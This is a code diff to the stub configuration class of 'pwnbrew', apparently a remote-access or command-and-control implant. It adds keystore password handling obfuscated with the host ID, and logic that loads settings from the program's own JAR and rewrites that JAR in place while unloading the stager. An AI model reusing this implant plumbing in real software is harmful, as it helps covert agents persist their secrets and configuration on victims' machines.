@@ -39,12 +39,19 @@ The copyright on this package is held by Securifera, Inc
 
 package pwnbrew;
 
-/*
-* ClientConfig.java
-*
-*/
-
+import java.io.File;
+import java.io.IOException;
+import java.io.InputStream;
+import java.net.URL;
+import java.net.URLConnection;
+import java.util.HashMap;
+import java.util.Map;
+import pwnbrew.log.LoggableException;
+import pwnbrew.misc.Constants;
+import pwnbrew.misc.DebugPrinter;
+import pwnbrew.misc.LoaderUtilities;
 import pwnbrew.misc.SocketUtilities;
+import pwnbrew.misc.Utilities;
 
 /**
  *
@@ -57,6 +64,10 @@ public class StubConfig {
     
     //Configurable Ports
     private transient int theSocketPort = 443;
+    
+    //Java keystore variables
+    private String theStorePass = "";
+    private String theCertAlias = "";
   
     //The time to sleep between connections
     private transient static StubConfig theConf = null;    
@@ -69,6 +80,69 @@ public class StubConfig {
     */
     public StubConfig() {      
     }
+    
+    
+     //==========================================================================
+    /**
+     * Returns the alias for the local certificate
+     * @return 
+    */
+    public String getAlias(){
+        return theCertAlias;
+    }
+
+     //==========================================================================
+    /**
+     * Sets the alias for the local certificate
+     * @param passedAlias
+    */
+    public void setAlias(String passedAlias){
+        theCertAlias = passedAlias;
+    }
+    
+     //==========================================================================
+    /**
+     * Returns the password to the java keystore for encryption
+     * @return 
+     * @throws pwnbrew.log.LoggableException 
+    */
+    public String getKeyStorePass() throws LoggableException {
+
+        String retVal = "";
+        String theKey = getHostId();
+
+        if(!theStorePass.isEmpty() && !theKey.isEmpty())
+            retVal = Utilities.simpleDecrypt(theStorePass, theKey);       
+
+        return retVal;
+    }
+
+     //==========================================================================
+    /**
+     * Sets the password to the java keystore in the configuration file
+     * @param passedKey
+     * @throws pwnbrew.log.LoggableException
+    */
+    public void setKeyStorePass(String passedKey) throws LoggableException {
+
+        String theKey = getHostId();
+        if(theKey.isEmpty()){
+            theKey = Integer.toString(SocketUtilities.getNextId());
+            setHostId(theKey);
+        }
+
+        //Make sure the passed key pass is not empty
+        if(passedKey != null ){
+            if( !passedKey.isEmpty() && !theKey.isEmpty() ){
+                String b64encoded = Utilities.simpleEncrypt(passedKey, theKey);
+                if(b64encoded != null)
+                    theStorePass = b64encoded;
+
+            } else
+                theStorePass = "";            
+        }
+    }
+    
 
     //==========================================================================
     /**
@@ -103,7 +177,7 @@ public class StubConfig {
      * @return 
     */
     public String getServerIp(){
-       return theServerIp;
+        return theServerIp;
     }
     
     //==========================================================================
@@ -112,9 +186,8 @@ public class StubConfig {
      * @param ipStr
     */
     public void setServerIp( String ipStr ) {
-        if(ipStr != null){
+        if(ipStr != null)
             theServerIp = ipStr;
-        }  
     }
 
     //==========================================================================
@@ -123,9 +196,8 @@ public class StubConfig {
      * @param hostIdStr
     */
     public void setHostId(String hostIdStr) {
-        if( hostIdStr != null ){
-            theHostId = hostIdStr;
-        }  
+        if( hostIdStr != null )
+            theHostId = hostIdStr;        
     }
       
     //===========================================================================
@@ -135,13 +207,114 @@ public class StubConfig {
     */
     public static StubConfig getConfig(){
         
-        if(theConf == null){
-            theConf = new StubConfig();
-            Integer anInteger = SocketUtilities.getNextId();
-            theConf.setHostId(anInteger.toString());
-        }
+        if(theConf == null)
+            theConf = loadConfiguration();   
         
         return theConf;
+    }
+    
+    //==========================================================================
+    /** 
+    *  Loads the configuration into memory.
+    */
+    private static StubConfig loadConfiguration(){
+        
+        //Create a new configuration file
+        StubConfig localConf = new StubConfig();
+        try {
+        
+            Integer anInteger = SocketUtilities.getNextId();
+            localConf.setHostId(anInteger.toString());
+            
+            //Get the manifest
+            Utilities.ManifestProperties localProperties = new Utilities.ManifestProperties();
+            String properties = Constants.MANIFEST_FILE;
+       
+            URL ourUrl = StubConfig.class.getProtectionDomain().getCodeSource().getLocation();
+            String aStr = ourUrl.toExternalForm();
+
+            final URL manifest =  new URL("jar:" + aStr + "!/" + properties);
+            URLConnection theConnection = manifest.openConnection();
+            InputStream localInputStream = theConnection.getInputStream();
+
+            if (localInputStream != null) {
+
+                //Load the properties
+                localProperties.load(localInputStream);
+                localInputStream.close();
+
+                //Get the alias
+                boolean saveFlag = false;
+                String certAlias = localProperties.getProperty(Constants.CERT_ALIAS, null);
+                if( certAlias == null || certAlias.isEmpty() ){
+                    
+                    //Try and get the hostname
+                    String hostname = SocketUtilities.getHostname();
+
+                    //Get the new alias and set it
+                    certAlias = new StringBuilder().append(hostname)
+                       .append("_").append(SocketUtilities.getNextId()).toString();
+
+                    localConf.setAlias(certAlias);
+                    saveFlag = true;
+                    
+                } else 
+                    localConf.setHostId( certAlias );
+                
+                //Get the alias
+                String certPW = localProperties.getProperty(Constants.CERT_PW, null);
+                if( certPW == null || certPW.isEmpty() ){
+                    //Create a new pw and save it
+                    certPW = Utilities.simpleEncrypt(Integer.toString( SocketUtilities.SecureRandomGen.nextInt()), 
+                            Long.toString( SocketUtilities.SecureRandomGen.nextLong()));
+                    localConf.setKeyStorePass(certPW);
+                    saveFlag = true;
+                } else 
+                    localConf.setKeyStorePass(certPW);
+                
+                //Save the conf
+                if( saveFlag )
+                    localConf.writeSelfToDisk();
+                
+            }
+            
+        } catch ( LoggableException | IOException ex ){
+            DebugPrinter.printMessage( NAME_Class, "listclients", ex.getMessage(), ex );
+        }
+
+       
+        return localConf;
+    } 
+    
+     //==========================================================================
+    /**
+     * Writes the configuration file to the appropriate place
+     * @throws pwnbrew.log.LoggableException
+    */
+    public void writeSelfToDisk() throws LoggableException {
+            
+        //Check for null
+        File theClassPath = Utilities.getClassPath();
+        ClassLoader aClassLoader;
+
+        //Check if we are coming from a stager 
+        aClassLoader = ClassLoader.getSystemClassLoader();            
+
+        //Get the properties 
+        String properties = Constants.MANIFEST_FILE;
+        Map<String, String> propMap = new HashMap<>();
+        propMap.put(Constants.CERT_ALIAS, theCertAlias );
+        propMap.put(Constants.CERT_PW, theStorePass );
+      
+        //Unload the stager
+        LoaderUtilities.unloadLibs( aClassLoader );
+
+        //Add the properties
+        Utilities.updateJarProperties( theClassPath, properties, propMap ); 
+
+        //Load it back
+        LoaderUtilities.reloadLib(theClassPath); 
+
     }
 
 }/* END CLASS StubConfig */
